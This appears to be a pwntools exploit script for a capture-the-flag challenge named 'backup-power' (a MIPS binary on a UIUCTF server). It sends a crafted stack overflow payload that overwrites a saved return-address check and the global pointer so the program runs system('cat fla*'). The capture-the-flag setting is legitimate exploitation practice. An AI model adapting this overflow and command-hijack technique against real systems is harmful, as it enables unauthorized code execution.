#!/usr/bin/env python3

from pwn import *

exe = ELF("./backup-power")

context.binary = exe
context.arch = "mips"


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
    elif args.GDB:
        r = gdb.debug([exe.path], gdbscript = "b *0x00400b04\n")
    else:
        r = remote("backup-power.chal.uiuc.tf", 1337, ssl = True)

    return r


def main():
    r = conn()

    r.sendlineafter(b"Username:", b"devolper")

    # Note: program uses sprintf() with "%s %s %s %s" as format string, so it needs 4 arguments of 4 bytes
    payload = flat(
                    b"A" * 24,
                    b"cat\x00",             # First argument
                    b"fla*",                # Second argument
                    p32(0x00) * 2,          # Last two remaining arguments that we will set to NULL
                    b"A" * 4,
                    p32(0x400b0c),          # Checks that the return address is the same as the one saved as "canary"
                    b"A" * 24,
                    p32(0x4aa330),          # $gp register (Global Pointer) points to global area, where strings to check against are stored
                    b"A" * 220,
                    b"system\x00"
                )

    r.sendline(payload)
    r.interactive()


if __name__ == "__main__":
    main()
